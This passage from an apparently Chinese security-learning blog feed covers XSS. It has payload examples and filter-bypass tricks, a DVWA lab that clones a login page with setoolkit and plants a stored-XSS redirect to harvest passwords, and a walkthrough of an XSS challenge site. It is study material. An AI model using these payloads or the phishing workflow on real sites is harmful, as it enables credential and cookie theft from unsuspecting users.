alt="Augenstern" loading="lazy"><br>第二个呢，emmmmmm，我设置嵌套的页面大小是0，所以没有什么变化。<br>**<em>页面重定向**</em></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">"https://zxcv0221.github.io"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"https://zxcv0221.github.io"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>第一个运行结果当然还是我的博客主页，嘿嘿。<img src="https://img-blog.csdnimg.cn/20200318183658902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二个与第一个运行结果相同。</p><p><strong><em>弹窗警告并重定向</em></strong></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"欢迎来到我的博客网站"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"https://zxcv0221.github.io"</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>这个可以弹个窗并加载到我的博客页面。<br><img src="https://img-blog.csdnimg.cn/20200318184004825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里我再点确定就会跳到我的博客。<br>**<em>访问恶意代码**</em></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://*********/xss.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>别看了，这玩意儿我没有，还看。。。。。。。。。。。。。。。。。。。。。。。。。<img src="https://img-blog.csdnimg.cn/20200318184148341.jpg" alt="Augenstern" loading="lazy"><br>**<em>巧用图片标签**</em></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token comment">/*与上面的&lt;script>标签相比有什么优点可以体会一下。嘿嘿*/</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss');"</span><span class="token operator">></span><span class="token comment">/*也可以弹窗*/</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"http://**********.***"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">></span><span class="token comment">/*可以放你想引导到什么网站，可以得到用户cookie，至于放什么照片，照片参数都可以自己设定。*/</span></code></pre><p><strong><em>绕开过滤的脚本</em></strong><br>大小写：<code>&lt;ScrIpT&gt;alert(&#39;xss&#39;)&lt;/ScRipt&gt;</code><br>字符编码，采用URL、base64等编码</p><pre class="language-css" data-language="css"><code class="language-css">&lt;a href=<span class="token string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;"</span>>小弹窗&lt;/a></code></pre><p>第二个运行结果：一个超链接<br><img src="https://img-blog.csdnimg.cn/20200319131125875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这上面的都是反射型的xss。<br>存储型的xss危害更大，其危险程度远大于反射型xss。<br>OK，就说到这里。<br>我溜………………</p><p><img src="https://img-blog.csdnimg.cn/20200319134605754.jpg" alt="Augenstern" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS盗取用户信息实验及xss之旅闯关</title>
      <link href="/posts/117d2c7d/"/>
      <url>/posts/117d2c7d/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近段时间学习xss，进行了比较详细的了解，也学了一个小实验，感觉挺有意思，记录下来。然后，后面就是xss之旅的闯关。</p><h1 id="xss盗取用户信息小实验"><a href="#xss盗取用户信息小实验" class="headerlink" title="xss盗取用户信息小实验"></a>xss盗取用户信息小实验</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>DVWA、kali linux、物理机或一台windows系统的虚拟机。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>实验原理：<br>克隆网站登录页面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。<br>我画的图。咳咳，太丑了，<img src="https://img-blog.csdnimg.cn/20200502173613895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>使用setoolkit工具克隆网站<br>setoolkit是一个kali自带的工具，要在root权限下使用。<br>使用工具克隆好网站后，去靶场插入xss存储型代码。<br>等待用户点击……<br>查看账户密码等信息。</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>打开DVWA，复制一下这个登录页面的url，(这个是个在线的靶场，不知道哪位好心人搭建的。IP就不打码了，想尝试一下的也可以用这个试一下。）<br><img src="https://img-blog.csdnimg.cn/20200502174034632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>登陆进去，先清理一下数据库记录(可有可无)<br><img src="https://img-blog.csdnimg.cn/20200502173931344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>打开kali终端<br>root用户登陆的话就输入 <code>setoolkit</code><br>普通用户就输入<code>sudo setoolkit</code>  回车<br><img src="https://img-blog.csdnimg.cn/20200502174434439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后输入<code>1</code>回车<br>输入<code>2</code>回车<br>输入<code>3</code>回车<br>输入<code>2</code>回车<br>然后出现这样的页面，打码的地方是我的IP地址，<br><img src="https://img-blog.csdnimg.cn/20200502174705691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后敲下回车键，就会提示让输入url，这个时候，将刚复制的DVWA的登录页面的URL输入进去，回车，出现这样的页面<br><img src="https://img-blog.csdnimg.cn/20200502175937153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>下一步打开kali的浏览器，输入我的虚拟机的IP地址，<br><img src="https://img-blog.csdnimg.cn/2020050218011736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现是这样的，证明克隆成功。<br>登陆进去，到存储型xss处插入代码<br><code>&lt;script&gt;window.location=&quot;http://***.***.**.***&lt;/script&gt;</code><br>这里有长度限制，就f12改一下。<br><img src="https://img-blog.csdnimg.cn/2020050218065686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后在win7虚拟机上进行登录</p><p><img src="https://img-blog.csdnimg.cn/20200502181803475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>点击存储型xss，<br><img src="https://img-blog.csdnimg.cn/20200502182830554.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>自动跳转到克隆的登录界面上，然后输入账号密码登录<br><img src="https://img-blog.csdnimg.cn/20200502181911837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>就会回到原来的网站登录页面。这个时候已经成功拿到了用户名和密码，后面就不管了。<br><img src="https://img-blog.csdnimg.cn/20200502181926710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查看盗取的信息，在kali终端就能看到下面的页面。<br>因为这里我试了两次，所以会有两次的记录。</p><p><img src="https://img-blog.csdnimg.cn/20200502182033363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>然后试验完成，Ctrl+Z就可以退出了。</p><h1 id="xss之旅"><a href="#xss之旅" class="headerlink" title="xss之旅"></a>xss之旅</h1><p><a href="http://test.ctf8.com/">在线xss平台</a></p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p><img src="https://img-blog.csdnimg.cn/20200503172340635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>构造简单的弹框代码成功弹窗即可。<code>&lt;script&gt;alert(1);&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200503172424813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>开始构造一个弹框的代码，发现无法弹框了。<br><img src="https://img-blog.csdnimg.cn/20200503172646989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>查看一下源码<br><img src="https://img-blog.csdnimg.cn/20200503172811593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>发现这里是我插入代码的位置，然后看到插入点是在input标签内部的，所以无法让浏览器识别弹框代码。这里要做的就是将前面的input标签提前闭合，还有后面的<code>&gt;</code>也要给它闭合，而且还要让它弹框。<br>所以这里构造</p><pre class="language-bash" data-language="bash"><code class="language-bash">"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200503172839194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p><img src="https://img-blog.csdnimg.cn/20200506153538350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>可以看出是尖括号，被转义了，所以尝试换个事件进行弹窗。<br>前面的value值是可以用单引号闭合，后面还有个双引号，可以把它以及后面的语句注释掉。构造payload</p><pre class="language-css" data-language="css"><code class="language-css">1' onmouseover=<span class="token function">alert</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span>//</code></pre><p><img src="https://img-blog.csdnimg.cn/20200506154047475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>知识拓展：<br>onmouseover在代码中表示的含义是 ——当鼠标指针移至元素之上时运行脚本<br>还有其他的事件可以选择使用，以下是我找的其他xss可以触发的事件的代码。<br><img src="https://img-blog.csdnimg.cn/20200506154529785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>第四关先用第三关的payload试一下，然后查看源码。</p><p><img src="https://img-blog.csdnimg.cn/20200506154318602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><p>只需要将第三关的单引号换成双引号即可<br><img src="https://img-blog.csdnimg.cn/20200506154212719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>进行on事件。但是发现on被分开了，中间多了个下划线<code>_</code><br><img src="https://img-blog.csdnimg.cn/20200506155049670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>那就再换构造语句，javascript伪协议<br>JavaScript伪协议介绍<br>将JavaScript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。<br>如果javascript:URL中的javascript代码中含有多个语句，必须使用分号将这些语句分隔开。</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token property">javascript</span><span class="token punctuation">:</span>var now = new <span class="token function">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">"&lt;h1>The time is:&lt;/h1>"</span> +now<span class="token punctuation">;</span>javascript URL还可以含有只执行动作，但不返回值的javascript语句<span class="token property">javascript</span><span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"hello,world!"</span><span class="token punctuation">)</span></code></pre><p>可以使用a标签来进行绕过。</p><pre class="language-css" data-language="css"><code class="language-css"><span class="token string">">&lt;a href="</span><span class="token property">javascript</span><span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span>"</code></pre><p><img src="https://img-blog.csdnimg.cn/20200506162150941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p><img src="https://img-blog.csdnimg.cn/20200506162328765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以看出，将href过滤了，还有其他的几个，on还有script都被过滤了。<br>看了大佬的博客，说是str_replace函数进行处理了，使用大小写绕过就行了。</p><pre class="language-css" data-language="css"><code class="language-css">">&lt;svg/Onload=<span class="token function">alert</span><span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span>>%0a</code></pre><p><img src="https://img-blog.csdnimg.cn/20200506163700295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>知识补充<br>HTML中的svg介绍<br>SVG意为可缩放矢量图形<br>SVG使用XML格式定义图像。<br>SVG文件可以通过以下标签嵌入HTML文档：</p><pre class="language-css" data-language="css"><code class="language-css">&lt;embed>、&lt;object>或者&lt;iframe>、也可以使用svg标签插入。</code></pre><p>闭合触发xss，</p><pre class="language-css" data-language="css"><code class="language-css">">&lt;svg onload=<span class="token function">alert</span><span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span>>%0a</code></pre><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p><img src="https://img-blog.csdnimg.cn/20200506164055341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这里它将我的on过滤了，变成了空格，然后想到了双写绕过<br>payload</p><pre class="language-css" data-language="css"><code class="language-css">">&lt;svg oonnload=<span class="token function">alert</span><span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span>>%0a</code></pre><p><img src="https://img-blog.csdnimg.cn/20200506164235773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p><img src="https://img-blog.csdnimg.cn/20200506164949929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>可以看出href被过滤了，双引号也被过滤了，script也被过滤。这个过滤了这么多东西，要想到通过编码来绕过。<br>HTML编码可以进行绕过，</p><pre class="language-css" data-language="css"><code class="language-css">&amp;#106<span class="token punctuation">;</span>&amp;#97<span class="token punctuation">;</span>&amp;#118<span class="token punctuation">;</span>&amp;#97<span class="token punctuation">;</span>&amp;#115<span class="token punctuation">;</span>&amp;#99<span class="token punctuation">;</span>&amp;#114<span class="token punctuation">;</span>&amp;#105<span class="token punctuation">;</span>&amp;#112<span class="token punctuation">;</span>&amp;#116<span class="token punctuation">;</span>&amp;#58<span class="token punctuation">;</span>&amp;#97<span class="token punctuation">;</span>&amp;#108<span class="token punctuation">;</span>&amp;#101<span class="token punctuation">;</span>&amp;#114<span class="token punctuation">;</span>&amp;#116<span class="token punctuation">;</span>&amp;#40<span class="token punctuation">;</span>&amp;#49<span class="token punctuation">;</span>&amp;#41<span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200506171517900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>这个是一种情况，还有一种情况是内容过滤，比如说，想通过弹窗事件来弹出某个内容，比如cookie。但是cookie如果被过滤了，<br>可以先将cookie进行base64加密，成一串base64编码，然后<br>atob：将base64进行解码，转换成明文，并通过eval来执行javascript代码。<br>再通过使用eval来执行语句。<br>可以构造一下payload</p><pre class="language-css" data-language="css"><code class="language-css">&lt;script><span class="token function">eval</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">'base64编码'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>&lt;/script></code></pre><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p><img src="https://img-blog.csdnimg.cn/2020051110511482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不合法的话，那就加上<code>http://</code><br><img src="https://img-blog.csdnimg.cn/2020051111233829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>发现，链接是合法了，但是script被过滤了。所以要进行绕过，<br>可以选择使用HTML编码绕过，还可以利用制表符(%09)等方法进行过滤。</p><pre class="language-payload" data-language="payload"><code class="language-payload">第一个：javasc&amp;#x72;ipt:%0dhttp:&#x2F;&#x2F;www.lalala.io%0dalert(1) 第二个：javascr%09ipt:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</code></pre><p><img src="https://img-blog.csdnimg.cn/20200511113926227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这个是将r转换成HTML编码了，当然也可以转换其他的字母，使得绕过script就行。</p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>没有看到注入框，结果找了一会，在控制台看到了隐藏的信息。<br>一个隐藏的表单。<br><img src="https://img-blog.csdnimg.cn/20200529224510949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>猜想可以在这里面进行注入，具体的还要一个一个试。<br>先进行在t_link框里进行注入尝试。，不过失败了。<br><img src="https://img-blog.csdnimg.cn/20200529224634161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>一个个尝试，最后发现在t_sort可以插入<br><img src="https://img-blog.csdnimg.cn/20200529224853425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>主要是尝试在哪个位置可以插入代码。</p><p> 闯关就先到这里吧，然后再把最近接触到的关于xss注入的知识点记录一下。</p><h1 id="xss注入番外"><a href="#xss注入番外" class="headerlink" title="xss注入番外"></a>xss注入番外</h1><ol><li>属性中的xss闭合引入事件</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">" <span class="token assign-left variable">onmouseover</span><span class="token operator">=</span>alert<span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span><span class="token operator">></span>        / /这个是鼠标放在上面就会触发xss，</code></pre><p>当然还有其他属性，点击后触发，等触发事件。<br>完整语句是</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>input/其他的标签 <span class="token assign-left variable">value</span><span class="token operator">=</span> 空 <span class="token assign-left variable">onmouseover</span><span class="token operator">=</span><span class="token string">"alert(document.domain)"</span><span class="token operator">></span></code></pre><ol start="2"><li>列表中的xss事件<br>HTML中的post方式的from表单提交。可以利用，插入xss语句。<br>burpsuite测试xss，使用Burpsuite截取http请求，修改提交参数。<br>闭合触发xss事件，用通过burpsuite在认为可能的地方插入xss代码进行闭合等操作。</li><li>HTML中的svg介绍<br>SVG意为可缩放矢量图形<br>SVG使用XML格式定义图像。<br>SVG文件可以通过以下标签嵌入HTML文档：</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>embed<span class="token operator">></span>、<span class="token operator">&lt;</span>object<span class="token operator">></span>或者<span class="token operator">&lt;</span>iframe<span class="token operator">></span>、也可以使用svg标签插入。闭合触发xss，"<span class="token operator">></span><span class="token operator">&lt;</span>svg <span class="token assign-left variable">onload</span><span class="token operator">=</span>alert<span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span><span class="token operator">></span>%0a诀窍：<span class="token variable"><span class="token variable">`</span>见框就插<span class="token variable">`</span></span>。</code></pre><ol start="4"><li>HTML表单文本框介绍<br>HTML表单用于搜集不同类型的用户输入。表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等等。text定义常规文本输入。<br>属性介绍：</li></ol><ul><li>value 属性规定输入字段的初始值</li><li>readonly属性规定输入字段为只读(不能修改)</li><li>disabled 属性规定输入字段是禁用的。被禁用的元素是不可用和不可点击的。被禁用的元素不会被提交。</li><li>size 属性规定输入字段的尺寸(以字符计)</li><li>maxlength 属性规定输入字段允许的最大长度。<br>如设置maxlength属性，则输入空间不会接受超过所允许数的字符。<br>该属性不会提供任何反馈。如果需要提醒用户，则必须编写JavaScript代码。<br>xss的payload长度计算<br>使用python的内置函数       <code>  len()</code><br>修改时直接修改maxlength参数就可以了。</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash">payload 触发xss漏洞<span class="token string">">&lt;svg/onload=alert(document.domain)>%0a或者：    "</span> <span class="token assign-left variable">onmouseover</span><span class="token operator">=</span>alert<span class="token punctuation">(</span>document.domain<span class="token punctuation">)</span><span class="token operator">></span></code></pre><ol start="5"><li>HTML事件介绍<br><img src="https://img-blog.csdnimg.cn/20200529230142530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></li><li>空格分割属性的xss<br>JavaScript伪协议介绍<br>将JavaScript代码添加到客户端的方法是把它放置在伪协议说明符javascript:后的URL中。这个特殊的协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。<br>如果javascript:URL中的javascript代码中含有多个语句，必须使用分号将这些语句分隔开。</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">javascript:var now <span class="token operator">=</span> new Date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">"&lt;h1>The time is:&lt;/h1>"</span> +now<span class="token punctuation">;</span>javascript URL还可以含有只执行动作，但不返回值的javascript语句javascript:alert<span class="token punctuation">(</span><span class="token string">"hello,world!"</span><span class="token punctuation">)</span></code></pre><ol 